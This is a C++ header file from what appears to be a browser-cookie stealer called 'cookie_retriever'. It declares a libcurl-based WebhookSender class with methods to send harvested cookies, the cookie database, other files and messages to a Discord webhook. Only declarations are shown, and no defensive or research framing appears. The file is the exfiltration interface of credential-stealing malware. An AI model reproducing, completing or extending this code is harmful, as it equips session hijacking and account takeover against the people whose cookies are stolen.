#ifndef COOKIE_RETRIEVER_WEBHOOK_SENDER_HPP
#define COOKIE_RETRIEVER_WEBHOOK_SENDER_HPP

#include "cookie.hpp"
#include <curl/curl.h>
#include <string>
#include <vector>

namespace cookie_retriever {

/**
 * @brief Handles sending data to Discord webhooks
 */
class WebhookSender {
private:
    std::string webhook_url;
    CURL* curl;
    struct curl_slist* headers;
    static bool curl_initialized;
    std::string stored_payload; // Store payload to prevent it from being destroyed

    static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp);
    bool send_payload(const std::string& payload, std::string& response);
    bool send_multipart(const std::string& file_path, const std::string& file_name, const std::string& content_type, std::string& response);

public:
    /**
     * @brief Constructs a webhook sender
     * @param url Discord webhook URL
     */
    explicit WebhookSender(const std::string& url);
    ~WebhookSender();

    // Prevent copying
    WebhookSender(const WebhookSender&) = delete;
    WebhookSender& operator=(const WebhookSender&) = delete;

    /**
     * @brief Sends cookies to the webhook
     * @param cookies Vector of cookies to send
     * @param db_path Path to the cookie database
     * @return true if successful
     */
    bool send_cookies(const std::vector<Cookie>& cookies, const std::string& db_path);

    /**
     * @brief Sends a text message to the webhook
     * @param message Message to send
     */
    void send_message(const std::string& message);

    /**
     * @brief Sends a single message to the webhook
     * @param message Message to send
     */
    void send_single_message(const std::string& message);

    /**
     * @brief Sends a file to the webhook
     * @param file_path Path to the file to send
     * @param file_name Name to give the file in Discord
     * @param content_type MIME type of the file
     * @return true if successful
     */
    bool send_file(const std::string& file_path, const std::string& file_name, const std::string& content_type);
};

} // namespace cookie_retriever

#endif // COOKIE_RETRIEVER_WEBHOOK_SENDER_HPP
